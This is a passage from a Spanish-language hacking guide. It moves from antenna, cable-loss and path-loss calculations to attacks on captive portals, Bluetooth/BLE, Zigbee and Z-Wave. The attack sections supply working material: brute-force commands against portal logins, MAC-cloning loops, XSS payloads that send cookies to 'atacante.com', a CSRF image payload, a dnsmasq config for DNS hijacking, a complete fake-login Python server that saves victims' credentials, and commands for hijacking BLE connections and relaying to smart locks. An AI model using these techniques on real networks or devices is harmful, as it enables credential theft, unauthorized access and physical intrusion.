  - Largo alcance, ángulo vertical muy angosto (~15°)
  - Crítica: si la inclinás, perdés señal arriba/abajo
  - La antena debe estar perfectamente vertical
```

```bash
# Regla práctica: cada +3 dBi duplica la potencia efectiva (EIRP)
# 2dBi -> 5dBi -> 8dBi: alcance aproximadamente duplicado
# Pero la zona vertical se reduce drásticamente
```

#### Yagi (Direccional)

La antena Yagi (inspirada en los diseñadores japoneses Yagi-Uda) tiene un elemento activo y varios parásitos (reflector + directores):

```
       Reflector   Elemento activo   Directores
           |            |          |||||
           =============O==========|||||
           
Patrón: haz angosto frontal, lóbulo trasero mínimo
Ganancia típica: 10-20 dBi
```

Ventajas para hacking:
- Apuntás a un AP específico, ignorás el resto
- Ideal para aislar una [red](../raw/r3d3s-f0nd4m3nt0s.md) en entornos densos
- Buena relación señal/ruido

#### Panel (Plana/Patch)

Las antenas de panel son plaquetas con un arreglo de parches:

```
Ventajas:
- Perfil delgado (fáciles de ocultar)
- Ancho de haz manejable (30-60°)
- Buena ganancia (14-24 dBi común)

Desventajas:
- Más pesadas que Yagi equivalentes
- Viento las afecta si van en mástil
```

#### Parabólica y Parabólica de Rejilla

```bash
# Parabólica sólida:
# Ganancia: 20-30 dBi
# Uso: enlaces punto a punto de 5-10km+
# Precio: $$$$$

# Parabólica de rejilla (grid):
# Ganancia: 24-34 dBi
# Uso: WiFi rural, enlaces ISP
# Ventaja: mucho más barata que sólida, menos viento
# Desventaja: el viento pasa a través, pero la rejilla reduce ganancia en ~2dB
# Precio: $$
```

```bash
# Ejemplo de alcance con parábolica 24dBi + Alfa AWUS036ACH:
# Línea de vista despejada: ~5-8km
# Área urbana (con obstáculos): ~1-2km
# Con antena mala: 50m
```

### dBi, dBm y Cálculo de Pérdidas

- **dBi**: ganancia de antena relativa a isotrópica (referencia teórica)
- **dBd**: ganancia relativa a dipolo (dBd = dBi - 2.15)
- **dBm**: potencia absoluta (0 dBm = 1 mW)
- **EIRP**: potencia radiada efectiva (dBm + dBi - pérdidas cable)

```
Cálculo de EIRP:
  EIRP(dBm) = Potencia_tx(dBm) + Ganancia_antena(dBi) - Pérdidas_cable(dB)

Ejemplo con Alfa AWUS036ACH:
  Potencia TX: 20 dBm (100 mW)
  Antena panel: 14 dBi
  Cable (5m LMR400): 1.5 dB pérdida
  EIRP = 20 + 14 - 1.5 = 32.5 dBm (1.78 W)
  
Límite legal FCC/Europa: EIRP máximo ~36 dBm (4W) en 5GHz
```

### Cable Loss — No Uses Cables Pedorros

| Cable | Pérdida por 10m a 2.4GHz | Pérdida por 10m a 5GHz | Costo |
|-------|:---:|:---:|:---:|
| RG-58 (mierda) | -5.5 dB | -11 dB | $ |
| RG-213 (bueno) | -2.8 dB | -5.5 dB | $$ |
| LMR-400 (muy bueno) | -1.1 dB | -2.2 dB | $$$ |
| LMR-600 (profesional) | -0.7 dB | -1.4 dB | $$$$ |
| Heliax 1/2" (bestia) | -0.3 dB | -0.6 dB | $$$$$ |

**Regla de oro**: no uses más de 5m de cable si podés evitarlo. Poné el adaptador WiFi cerca de la antena y usá USB extendido en vez de cable coaxial largo.

```bash
# El cable USB también tiene pérdidas:
# USB 2.0: máximo 5m sin repetidor
# USB 3.0: máximo 3m
# Con repetidor activo (extensor USB): hasta 50m con cable adecuado

# Mejor práctica: Raspberry Pi en la ventana + antena afuera
# Control remoto por WiFi/SSH
```

### Comparación de Chipsets WiFi para Ataques

| Chipset | Modelos | Modo Monitor | Inyección | 2.4GHz | 5GHz | Potencia TX | [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) |
|---------|---------|:---:|:---:|:---:|:---:|:---:|--------|
| **Atheros AR9271** | TP-Link TL-WN722N v1 | ✅ | ✅ | ✅ | ❌ | 20 dBm | ath9k_htc |
| **Atheros AR9280** | Mini PCIe | ✅ | ✅ | ✅ | ✅ | 18 dBm | ath9k |
| **Atheros AR9582** | Compex WLE300NX | ✅ | ✅ | ✅ | ✅ | 27 dBm | ath9k |
| **Ralink RT3070** | Alfa AWUS036NH | ✅ | ✅ | ✅ | ❌ | 26 dBm | rt2800usb |
| **Ralink RT3572** | Alfa AWUS036NE | ✅ | ✅ | ✅ | ✅ | 25 dBm | rt2800usb |
| **Mediatek MT7610U** | Panda PAU06 | ✅ | ✅ | ✅ | ✅ | 20 dBm | mt76x0u |
| **Mediatek MT7662U** | Alfa AWUS036ACM | ✅ | ✅ | ✅ | ✅ | 22 dBm | mt76x2u |
| **Realtek RTL8812AU** | Alfa AWUS036ACH | ✅ | ✅ | ✅ | ✅ | 25 dBm | rtl88XXau |
| **Realtek RTL8814AU** | Alfa AWUS1900 | ✅ | ✅ | ✅ | ✅ | 25 dBm | rtl88XXau |
| **Realtek RTL8187L** | USB genérico | ✅ | ✅ | ✅ | ❌ | 20 dBm | rtl8187 |
| **Intel AX200/AX210** | Laptop (M.2) | ✅ | ✅ | ✅ | ✅ | 20 dBm | iwlwifi |
| **Qualcomm QCA6174** | Laptop (M.2) | ✅ | ✅ | ✅ | ✅ | 20 dBm | ath10k |

### Potencia TX y Amplificadores

```bash
# La mayoría de los adaptadores USB tienen 20-27 dBm (100-500 mW)
# No necesitás más de 20 dBm para la mayoría de ataques
# Lo que importa es la antena, no la potencia

# Amplificadores externos:
# - Aumentan la potencia a 1-10W (30-40 dBm)
# - EJEMPLO: Alfa ANA-W30 (2W amplificador)
# - Legal: generalmente NO es legal sin licencia
# - Práctico: útil para larga distancia pero quemás front-ends

# Problema con los amplificadores:
# 1. Ruido de fase: reducen SNR en vez de mejorarla
# 2. Saturación: si el chip manda más de lo que el amplificador espera,
#    se genera distorsión armónica
# 3. Calor: los amplificadores generan MUCHO calor
# 4. Alimentación: necesitan baterías extra o fuente externa
```

### Filtrado de Señal

En entornos con mucha interferencia, los filtros ayudan:

- **Band-pass**: solo pasa la frecuencia que te interesa (2.4GHz o 5GHz). Eléctrico o cavidad.
- **Low-pass**: solo pasa frecuencias bajas (para 2.4GHz, corta arriba de 2.5GHz)
- **High-pass**: solo pasa frecuencias altas (para 5GHz, corta abajo de 5GHz)

```bash
# Ejemplo: filtrar interferencia de horno microondas (2.45GHz)
# Un filtro band-pass 2.4-2.48GHz elimina el ruido del microondas
# Mejora SNR en ~5-10 dB en ambientes con microondas cerca

# Conectores:
# SMA: el más común en WiFi (RP-SMA en antenas de consumo)
# N-type: profesional, mejores pérdidas, más robusto
# U.FL: conectores miniatura en tarjetas M.2
# MMCX: similar a U.FL, más chico
# TNC: similar a SMA pero rosca más gruesa (antiguo)
```

```bash
# Convertir conectores
# RP-SMA (hembra) -> SMA (macho): adaptador común
# SMA -> N-type: para cable LMR-400
# Cuidado: RP-SMA tiene pin invertido respecto a SMA
# RP-SMA hembra tiene pin (la antena lo tiene)
# SMA hembra tiene hueco
```

### Free Space Path Loss (FPSL) — Cálculos

La señal se pierde con la distancia. La fórmula:

```
FSPL(dB) = 20 * log10(distancia) + 20 * log10(frecuencia) + 32.44

Donde:
  - distancia: en kilómetros
  - frecuencia: en MHz
  - 32.44: factor de conversión

Ejemplo:
  AP a 500m, en 2.4GHz (2442 MHz, canal 6):
  FSPL = 20*log10(0.5) + 20*log10(2442) + 32.44
       = -6.02 + 67.76 + 32.44
       = 94.18 dB

  AP a 500m, en 5GHz (5180 MHz, canal 36):
  FSPL = 20*log10(0.5) + 20*log10(5180) + 32.44
       = -6.02 + 74.29 + 32.44
       = 100.71 dB

Conclusión: la misma distancia en 5GHz pierde ~6.5 dB más.
```

### Fresnel Zone

La zona de Fresnel es el área entre la antena y el AP que debe estar despejada para máxima transmisión:

```
Radio de la 1ra zona de Fresnel (metros):
  r = 8.657 * sqrt(distancia_km / frecuencia_GHz)
  
Ejemplo para 1km en 2.4GHz:
  r = 8.657 * sqrt(1 / 2.4) = 8.657 * 0.645 = 5.6m

Esto significa: necesitás un tubo imaginario de ~11 metros de diámetro
DESPEJADO entre vos y el AP para no tener pérdidas por Fresnel.
Cualquier obstáculo (árboles, edificios, autos) reduce la señal.
```

### SNR y Receive Sensitivity

```bash
# SNR (Signal-to-Noise Ratio)
# SNR = RSSI - Noise Floor
# Ejemplo: RSSI = -65 dBm, Noise = -95 dBm
# SNR = 30 dB (excelente)

# Mínimo SNR requerido para cada modulación:
# BPSK (6 Mbps):  ~6 dB SNR
# QPSK (18 Mbps): ~10 dB SNR
# 16-QAM (36 Mbps): ~16 dB SNR
# 64-QAM (54 Mbps): ~24 dB SNR
# 256-QAM (MCS7): ~30 dB SNR (802.11n/ac)

# Si estás capturando handshakes:
# SNR > 15 dB: captura confiable
# SNR 10-15 dB: captura posible, algunos paquetes se pierden
# SNR < 10 dB: muy difícil, muchos reintentos necesarios
```

### Adjacent Channel Interference (ACI) y Co-Channel Interference (CCI)

```bash
# ACI: señal de canales vecinos interfiere
# En 2.4GHz solo hay 3 canales no solapados: 1, 6, 11
# Si un AP está en canal 3 y otro en canal 4, interfieren entre sí

# CCI: dos APs en el mismo canal
# Se pisan entre sí, reduciendo throughput y aumentando ruido

# Para ataques: canal 6 suele ser el más congestionado
# Canal 1 y 11 suelen tener menos tráfico

# Escanear ocupación de canales:
airodump-ng wlan0mon
# La columna "Beacons" muestra cuánto tráfico tiene cada red
# Muchos beacons en el mismo canal = interferencia
```

### Weather Effects en 5GHz

```bash
# La lluvia afecta 5GHz mucho más que 2.4GHz
# Pérdida por lluvia a 5GHz: ~1 dB/km en lluvia moderada
# Pérdida por lluvia a 2.4GHz: ~0.1 dB/km (casi nada)

# La niebla espesa también afecta 5GHz
# Nieve: afecta más por acumulación en antenas que por atenuación

# Para ataques de larga distancia en 5GHz:
# - Elegí un día despejado
# - Evitá horarios de lluvia
# - Usá 2.4GHz si el tiempo está feo
```

### Foliage Attenuation (Pérdida por Árboles)

Los árboles tienen alto contenido de agua y atenúan la señal WiFi:

```
Un árbol con hojas a 2.4GHz: 10-20 dB de pérdida
Un árbol con hojas a 5GHz:   20-30 dB de pérdida
Un árbol sin hojas a 2.4GHz: 5-10 dB de pérdida

Si tenés 3 árboles entre vos y el AP a 5GHz:
Pérdida total: 60-90 dB (se come TODO el presupuesto de enlace)
```

### Building Material Attenuation

| Material | Pérdida 2.4GHz | Pérdida 5GHz | 
|----------|:---:|:---:|
| Madera seca (2.5cm) | 2-3 dB | 3-5 dB |
| Ladrillo (10cm) | 5-10 dB | 10-15 dB |
| Hormigón (15cm) | 15-20 dB | 20-30 dB |
| Metal (2.5cm) | 25-30 dB | 30-35 dB |
| Vidrio templado | 5-8 dB | 10-15 dB |
| Vidrio bajo emisivo | 10-15 dB | 20-25 dB |
| Drywall | 2-3 dB | 3-5 dB |
| Piedra (30cm) | 20-25 dB | 25-35 dB |

```bash
# Cálculo completo de enlace para captura:
# EIRP = 20 dBm (TX) + 14 dBi (antena) - 1.5 dB (cable) = 32.5 dBm
# FSPL a 500m en 5GHz = 100 dB
# Pérdidas por 1 pared de ladrillo = 10 dB
# Pérdidas por atmósfera = despreciable a esta distancia
# 
# RSSI estimado en el AP (que manda a -20 dBm):
# -20 + 14 - 1.5 - 100 - 10 = -117.5 dBm
# 
# Esto es DEMASIADO débil. Necesitás:
# - Más ganancia de antena (24 dBi parábolica)
# - O menor distancia
# - O 2.4GHz (menos FSPL)

# RSSI estimado en 2.4GHz:
# -20 + 14 - 1.5 - 94 - 10 = -111.5 dBm
# Sigue siendo débil. Conclusión: acercate.
```

### RSSI y Distancia (con antena omnidireccional 9dBi)

| RSSI (dBm) | Distancia 2.4GHz | Distancia 5GHz | Captura [handshake](../raw/w1f1-4tt4cks.md#handshake) |
|:---:|:---:|:---:|:---:|
| -30 | 1-3m | 0.5-2m | Excelente |
| -50 | 10-15m | 5-10m | Perfecta |
| -67 | 30-50m | 15-30m | Buena |
| -75 | 50-80m | 30-50m | Aceptable |
| -85 | 100-150m | 50-80m | Difícil |
| -95 | 200-300m | 80-150m | Muy difícil (antenón necesario) |

---

## Captive Portal Exploitation — Técnicas Avanzadas

### Detección de Captive Portal

Los captive portals son páginas de login que interceptan el tráfico [http](../raw/r3d3s-f0nd4m3nt0s.md#http) hasta que el usuario se autentica. Se detectan fácilmente:

```bash
# Método estándar: intentar acceder a un sitio conocido
curl -o /dev/null -w '%{http_code}' http://connectivitycheck.gstatic.com/generate_204
# 204 = sin portal (conexión directa)
# 302/200 = redirigido al portal

# Método alternativo: Windows
curl http://www.msftconnecttest.com/connecttest.txt

# Método Apple
curl http://captive.apple.com/hotspot-detect.html

# Si cualquiera redirige, hay captive portal
```

### Captive Portal Detection Bypass

Algunos dispositivos detectan portals y abren el [navegador](../raw/br0ws3r-3xpl01t4t10n.md) automáticamente. Técnicas para evitarlo:

```bash
# 1. User-Agent spoofing
# Los portals a veces identifican el SO por User-Agent
# Si detectan iOS/Android, muestran portal; si no, dejan pasar
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://google.com

# 2. HTTPS antes de HTTP
# Algunos portals solo interceptan HTTP, dejan pasar HTTPS
# Probá https://google.com directamente

# 3. IP del portal directamente
# Si sabés la IP del portal (gateway), podés evitar la redirección
curl --header "Host: google.com" http://192.168.1.1/

# 4. Puerto alternativo
# Algunos portals solo monitorean puertos 80 y 443
# Probá SSH en puerto 22 o 2222 hacia afuera
ssh -p 2222 usuario@servidor-externo.com

# 5. IPv6
# Muchos portals no interceptan IPv6
ping6 -c 4 google.com
curl -6 http://google.com

# 6. VPN over DNS tunneling
# Si el portal deja pasar DNS, podés túnear con iodine
apt install iodine
iodine -f -P contraseña tun.dns-server.com
# Después tenés tun0 con internet real
```

### Captive Portal Click-Through (Sin Autenticación Real)

Muchos portals tienen un botón "Aceptar términos y condiciones" que NO requiere autenticación real. Esto pasa cuando:

```bash
# 1. El portal solo registra la MAC como "autorizada"
# 2. El portal abre el acceso después de cualquier click
# 3. El portal no verifica credenciales reales

# Automatizar click-through:
curl -X POST http://portal/login \
  -d "accept=true&tos=1&mac=AA:BB:CC:DD:EE:FF"
```

### Captive Portal [credential stuffing](../raw/p4ssw0rd-4tt4cks.md#credential-stuffing)

Si el portal usa autenticación (usuario + contraseña), podés automatizar ataques de [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta):

```bash
# 1. Identificar los parámetros del formulario de login
curl -v http://portal/login
# Buscar: <form action="/login" method="POST">

# 2. Probar credenciales por defecto:
# admin/admin, admin/1234, user/user, guest/guest
# root/root, admin/contraseña, admin/sincontraseña
# 1234/1234, 0000/0000

# 3. Fuerza bruta con Hydra:
hydra -L usuarios.txt -P contraseñas.txt portal http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrecta"

# 4. Fuerza bruta con wfuzz:
wfuzz -c -z file,usuarios.txt -z file,contraseñas.txt \
  -d "user=FUZZ&pass=FUZ2Z" http://portal/login

# 5. Session Prediction:
# Si el portal asigna session tokens secuenciales o predecibles:
for i in {1..1000}; do
  curl -b "session_id=$i" http://portal/dashboard
  # Si alguno devuelve el dashboard sin login, hay session prediction
done
```

### Captive Portal Session Hijacking

Si el portal usa cookies de sesión que se pueden interceptar:

```bash
# 1. Sniffing de tráfico HTTP (no HTTPS)
# Capturar cookies enviadas en texto claro
tcpdump -i wlan0 -A -s 0 'port 80' | grep -i "cookie\|session"

# 2. Cross-site scripting (si el portal tiene vulnerabilidades)
# Inyectar script que robe cookies:
# <script>new Image().src='http://atacante.com/steal.php?c='+document.cookie</script>

# 3. Session fixation
# Si el portal permite fijar session ID:
# 1. Atacante obtiene session ID del portal
# 2. Atacante envía link a la víctima con ese session ID
# 3. Víctima se autentica con ese session ID
# 4. Atacante usa el mismo session ID para acceder
```

### Captive Portal MAC Bypass

Muchos portals autorizan por MAC address después del login. Si clonás la MAC de un cliente ya autorizado:

```bash
# 1. Esperar a que un cliente se autentique en el portal
# 2. Capturar su MAC address
airodump-ng wlan0mon
# STATION: muestra clientes conectados

# 3. Clonar la MAC
ifconfig wlan0 down
macchanger -m CLIENTE_AUTORIZADO_MAC wlan0
ifconfig wlan0 up

# 4. Pedir IP por DHCP
dhclient wlan0
# El portal ya tiene la MAC como autorizada

# 5. También funciona si el portal expira la sesión después de N horas
# La MAC sigue autorizada aunque el cliente se fue

# Automatizar:
for mac in $(grep "STATION" captura.txt | awk '{print $1}'); do
  ifconfig wlan0 down
  macchanger -m $mac wlan0
  ifconfig wlan0 up
  dhclient wlan0
  ping -c 1 google.com && echo "MAC $mac funciona!" && break
done
```

### Captive Portal [csrf](../raw/w3b-h4ck1ng.md#csrf)

Cross-Site Request Forgery: si el portal tiene acciones vulnerables a CSRF, podés hacer que el admin ejecute acciones sin querer:

```bash
# Ejemplo: portal admin con función de agregar usuarios
# http://portal/admin/add_user?user=nuevo&pass=1234

# Crear página maliciosa:
# <img src="http://portal/admin/add_user?user=atacante&pass=12345" width="0" height="0">
# Si el admin carga la página, se agrega un usuario atacante
```

### Captive Portal [xss](../raw/w3b-h4ck1ng.md#xss)

cross-site [scripting](../raw/w3b-h4ck1ng.md#xss): si el portal no sanitiza inputs, podés ejecutar JavaScript en el contexto del portal:

```bash
# Campos comunes vulnerables:
# - Nombre de usuario (se muestra en pantalla de bienvenida)
# - MAC address (a veces se muestra)
# - URL de redirección post-login

# Inyección básica:
<script>alert('XSS')</script>

# Robo de cookies:
<script>fetch('http://atacante.com/steal?c='+document.cookie)</script>

# Redirección a phishing:
<script>window.location='http://portal-falso.com'</script>
```

### Captive Portal [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) Redirection

Cuando interceptás el portal ([evil twin](../raw/w1f1-4tt4cks.md#evil-twin)), podés redirigir DNS para mostrar tu propio portal falso:

```bash
# Configurar dnsmasq para redirigir TODO el DNS a tu portal
cat > dnsmasq.conf << EOF
interface=wlan0mon
bind-interfaces
domain-needed
bogus-priv
dhcp-range=192.168.1.2,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
EOF

# Esto redirige TODAS las consultas DNS a tu servidor web
# Cualquier sitio que el usuario intente visitar
# termina en tu página de phishing
```

### Captive Portal Persistent Login Bypass

Algunos portals tienen "Recordarme" o "Login persistente" que usa cookies/tokens de larga duración:

```bash
# 1. Capturar la cookie persistente
# Las cookies suelen tener nombres como:
# "remember_me", "token", "auth_token", "persistent"

# 2. Reutilizar la cookie desde otro dispositivo
curl -b "remember_me=TOKEN_ROBADO" http://portal/dashboard

# 3. Si el token es un hash de MAC + timestamp:
# Podés generar tokens falsos
# Ejemplo: token = MD5(MAC + fecha)
python3 -c "
import hashlib
mac = 'aa:bb:cc:dd:ee:ff'
fecha = '2024-01-01'
token = hashlib.md5((mac + fecha).encode()).hexdigest()
print(token)
"
```

### Captive Portal con Evil Twin (Repaso Extendido)

```bash
# El ataque completo con captive portal:
# 1. Configurar AP falso (hostapd)
# 2. Configurar DHCP/DNS (dnsmasq)
# 3. Configurar iptables para redirigir tráfico
# 4. Servir página de login falsa
# 5. Capturar credenciales
# 6. Redirigir a sitio real después del login

# Portal falso que captura y reenvía:
cat > portal.py << 'EOF'
import http.server
import urllib.parse
import requests

class AuthPortal(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'''
<!DOCTYPE html>
<html><head><title>WiFi</title></head>
<body>
<h2>Red WiFi Corporativa</h2>
<p>Su sesi\u00f3n ha expirado. Ingrese sus credenciales:</p>
<form method="POST" action="/login">
  Usuario: <input type="text" name="username"><br>
  Contrase\u00f1a: <input type="password" name="password"><br>
  <input type="submit" value="Conectar">
</form>
</body></html>
''')
        elif self.path == '/success':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<html><body><h3>Conectado!</h3><meta http-equiv="refresh" content="3;url=http://google.com"></body></html>')
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            body = self.rfile.read(length).decode()
            params = urllib.parse.parse_qs(body)
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            # Guardar credenciales
            with open('/tmp/credentials.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
            
            # Reenviar al portal real (si existe)
            # RealLogin(params)
            
            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()

http.server.HTTPServer(('0.0.0.0', 80), AuthPortal).serve_forever()
EOF

python3 portal.py &
```

---

## Hotspot 2.0 / Passpoint

Hotspot 2.0 (Passpoint) automatiza la conexión a hotspots usando 802.11u. Es usado por operadoras (Telecom Personal, Movistar, etc.).

```bash
# Escanear redes con 802.11u
airodump-ng wlan0mon
# Fijarse si aparece "802.11u" o "Interworking"

# Con bettercap detectar
bettercap -eval "wifi.recon on"
# En la interfaz web, buscá "Hotspot 2.0"

# La explotación es limitada pero se puede:
# - Capturar credenciales via Rogue Hotspot 2.0
# - Usar ANQP (Access Network Query Protocol) para leak de info
```

---

## Bluetooth Coexistencia y Ataques IoT

### Bluetooth y [wifi](../raw/w1f1-4tt4cks.md) 2.4GHz — Interferencia

Bluetooth y WiFi 2.4GHz comparten la misma banda (2.400-2.4835 GHz). BT salta entre 79 canales de 1MHz, WiFi usa 22MHz por canal.

```bash
# Ver si hay interferencia BT
# Los paquetes WiFi 2.4GHz se pierden cuando BT transmite
# WiFi usa AFH (Adaptive Frequency Hopping) para evitarlo, pero no siempre funciona

# Solución:
# 1. Deshabilitar BT completamente
systemctl stop bluetooth
rfkill block bluetooth

# 2. O cambiar WiFi a 5GHz (no comparten banda)
airmon-ng start wlan0
airodump-ng --band a wlan0mon

# 3. O configurar coexistencia (algunos drivers Intel)
echo "options iwlwifi bt_coex_active=0" > /etc/modprobe.d/iwlwifi.conf

# 4. En Raspberry Pi, BT y WiFi comparten el mismo chip (BCM43439)
# La interferencia es peor. Usá adaptador USB externo para monitorear.
```

### Bluetooth Low Energy (BTLE) — Escaneo y Explotación

BTLE opera en 2.4GHz pero usa 40 canales de 2MHz. Los anuncios de dispositivos BTLE se pueden capturar, analizar y explotar.

```bash
# Escaneo BTLE con Bettercap
bettercap -eval "ble.recon on"

# Escaneo con hcitool
hcitool lescan

# Escaneo con btlejack (herramienta avanzada)
btlejack -s -c hci0

# Sniffing BTLE (necesita hardware compatible: nRF51822, nRF52840)
btlejack -f -d -t 300

# Analizar advertisements BTLE
# Los anuncios contienen:
# - MAC address (puede ser aleatoria)
# - UUID de servicios
# - Inombre del dispositivo
# - Datos específicos del fabricante

tshark -r btle_capture.pcap -Y "btle"
```

#### BTLE Advertisement Exploitation

```bash
# Clonar beacon BTLE
# Los beacons BTLE (iBeacon, Eddystone) se pueden clonar
bettercap -eval "ble.recon on; ble.show"

# Spoofear señal BTLE
# Con nRF52840: transmitir anuncios falsos
btlejack -i hci0 -a -u "8062466-..."

# Ataque a BLE beacons:
# 1. Capturar el UUID del beacon
# 2. Transmitir el mismo UUID con mayor potencia
# 3. Los dispositivos reciben la señal falsa
# 4. Se rompe la lógica de proximidad
```

#### Bluetooth Pairing Attacks

Bluetooth pairing tiene varios métodos y todos tienen vulnerabilidades:

```bash
# 1. Just Works (sin autenticación)
# Vulnerable a MITM: el atacante se interpone entre los dos dispositivos

# 2. Passkey Entry (PIN de 6 dígitos)
# Solo 1,000,000 combinaciones. Atacable por fuerza bruta si no hay rate limiting
bettercap -eval "ble.recon on; ble.brute 123456"

# 3. Out of Band (NFC/QR)
# Seguro si el OOB es seguro. Pero la implementación NFC suele ser débil en algunos dispositivos

# 4. LE Secure Connections (SC) (AES-CMAC)
# El más seguro, usa ECDH. Pero hay downgrade attacks a LE Legacy

# 5. Bluetooth Classic (BR/EDR) Pairing
# Vulnerable a KNOB attack (Key Negotiation of Bluetooth)
# Reduce la entropía de la clave a solo 1 byte
```

#### KNOB Attack ([cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2019-9506)

```bash
# KNOB: Key Negotiation of Bluetooth
# Durante el pairing, negociamos la longitud de la clave de cifrado
# El atacante interviene y fuerza una clave de 1 byte (8 bits)

# El ataque funciona siempre que los dos dispositivos tengan la vulnerabilidad
# Afecta BR/EDR (Bluetooth clásico)

# Después de KNOB, crackear el cifrado es trivial
# Solo hay 256 posibilidades
```

#### BlueBorne (CVE-2017-0777, CVE-2017-0781, CVE-2017-0782, CVE-2017-0785)

```bash
# BlueBorne es una familia de vulnerabilidades que afecta BT stacks
# No necesita pairing: ataca durante el discovery

# Ataques BlueBorne:
# - Remote Code Execution
# - Information Leak
# - Man-in-the-Middle

# Herramienta: blueborne-scanner
git clone https://github.com/ArmisSecurity/blueborne-scanner.git
cd blueborne-scanner
python blueborne-scanner.py hci0

# Según el resultado, podés explotar:
# - CVE-2017-0781: RCE en Android (BT server socket)
# - CVE-2017-0782: RCE en Android (BNEP)
# - CVE-2017-0777: RCE en Linux (BlueZ)
```

#### Bluetooth Hijacking

```bash
# Interceptar conexión BT activa
# Si un dispositivo ya está conectado a otro, no es trivial interceptarlo
# Pero con btlejack:
btlejack -f -t 1000  # Escaneá dispositivos conectados
btlejack -j AA:BB:CC:DD:EE:FF  # Intentar hijack

# Otra técnica: jammer BT + reconexión forzada
# Bloqueás BT temporalmente -> el dispositivo busca reconectarse
# Cuando busca, vos respondés primero como el dispositivo legítimo
```

#### BLE Beacon Spoofing

```bash
# Los beacons BLE se usan para:
# - Proximidad (Apple iBeacon)
# - Notificaciones de tiendas
# - Seguimiento de empleados
# - Cerraduras inteligentes

# Spoofear un iBeacon:
bettercap -eval "ble.recon on; set ble.beacon.uuid E2C56DB5-DFFB-48D2-B060-D0F5A71096E0; set ble.beacon.major 1; set ble.beacon.minor 1; ble.beacon on"

# iBeacon format:
# UUID: 16 bytes (identificador único)
# Major: 2 bytes (grupo)
# Minor: 2 bytes (subgrupo)
# TX Power: 1 byte

# Spoofear Eddystone (Google):
# Eddystone-UID: namespace + instance
# Eddystone-URL: URL codificada
# Eddystone-TLM: datos de telemetría
```

#### BTLE Relay Attack

Un ataque de relay BTLE extiende el alcance de un dispositivo BTLE:

```bash
# Escenario: cerradura BTLE en una casa
# 1. Atacante A está cerca de la cerradura
# 2. Atacante B está cerca del dueño con el teléfono
# 3. Atacante A relayea el challenge de la cerradura a Atacante B
# 4. Atacante B relayea la respuesta del teléfono a Atacante A
# 5. Atacante A abre la cerradura

# Herramienta: btlejack relay o proxmark3
btlejack -r -f

# Con dos nRF52840:
# nrf1 recibe señal de la cerradura
# nrf2 relayea al teléfono
```

#### Apple AirDrop/Continuity Interception

```bash
# AirDrop usa BTLE para discovery y WiFi Direct para transferencia
# Los anuncios BTLE contienen hashes del Apple ID

# Capturar anuncios AirDrop:
bettercap -eval "ble.recon on"
# Buscar señales con tipo Apple Continuity (0x4C, 0x0007)

# Los anuncios contienen:
# - Apple ID hash (SHA256 del email/teléfono)
# - Nombre del dispositivo
# - Modelo de iPhone

# Hash de email/teléfono se puede atacar offline:
# rainbow table de emails/teléfonos comunes

# Herramienta: airdrop-phone
git clone https://github.com/seemoo-lab/airdrop-phone.git
cd airdrop-phone
python airdrop-leak.py -r captura.pcap
```

#### [android](../raw/4db-d33p-d1v3.md) Nearby Share Interception

```bash
# Similar a AirDrop pero de Google
# Usa BTLE + WiFi P2P
# Los anuncios contienen:
# - Hash del número de teléfono o email
# - Name del dispositivo
# - Certificados temporales

# Capturar con bettercap o Wireshark
# Análisis offline de hashes
```

### Zigbee Attacks

Zigbee es usado en domótica (IoT) en la banda de 2.4GHz. Comparte frecuencias con WiFi.

```bash
# Herramientas para Zigbee:
# - Zigbee Inspector
# - KillerBee
# - Z-Fuzz
# - ApiMote (hardware)

# Hardware necesario:
# - TI CC2531 USB dongle ($)
# - API-mote ($$)
# - ATUSB RZUSBStick ($$)
# - HackRF / SDR ($$$)

# Instalar KillerBee:
apt install killerbee
pip install killerbee

# Escanear redes Zigbee:
zbstumbler -i /dev/ttyACM0

# Capturar tráfico Zigbee:
zbdump -i /dev/ttyACM0 -w zigbee.pcap

# Sniff con Wireshark
wireshark zigbee.pcap
# Filtrar: zbee_sec

# Ataques Zigbee:
# 1. Network Key extraction (si el dispositivo usa default key)
# 2. Replay attack (capturar y retransmitir comandos)
# 3. Zigbee Green Power exploitation (GP no encripta)
# 4. Touchlink attack (aproximación física para unir dispositivos)
# 5. ZCL command injection
```

#### Zigbee Touchlink Attack

```bash
# Touchlink permite unir dispositivos Zigbee por proximidad
# El atacante se acerca a un dispositivo y "toca" para unirlo
# Después manda comandos para abrir persianas, apagar luces, etc.

# El comando Touchlink no requiere autenticación en muchas implementaciones
# Envía un "Scan Request" y el dispositivo responde con su información
# Después mandás "Device Announce" y "Bind" para tomar control

# Herramienta: zbtouchlink
zbtouchlink -i /dev/ttyACM0 -r  # Scan
zbtouchlink -i /dev/ttyACM0 -s MAC_TARGET  # Atacar
```

### Z-Wave Attacks

Z-Wave usa 908 MHz (USA) o 868 MHz (Europa), evitando la congestión de 2.4GHz.

```bash
# Hardware: Z-Wave USB stick (Aeotec, Z-Stick)
# Software: EZ-Wave, Z-Wave PC Controller

# Escanear Z-Wave:
python ez-wave.py -i /dev/ttyACM0 -s

# Ataques Z-Wave:
# 1. Z-Wave S0 (viejo, usa DES) — completamente roto
# 2. Z-Wave S2 (nuevo, usa ECDH) — más seguro pero hay vulnerabilidades conocidas
# 3. Replay attacks (S0 no tiene protección de replay)
# 4. Network key sniffing durante inclusion (S0 manda la clave en claro)
# 5. Door lock manipulation (si conseguís la network key)
```

### Hardware para IoT Attacks

| Dispositivo | Protocolos | Precio | Complejidad |
|-------------|-----------|:------:|:-----------:|
| TI CC2531 | Zigbee, BTLE | $ | Baja |
| nRF52840 Dongle | BTLE, Thread, 802.15.4 | $$ | Media |
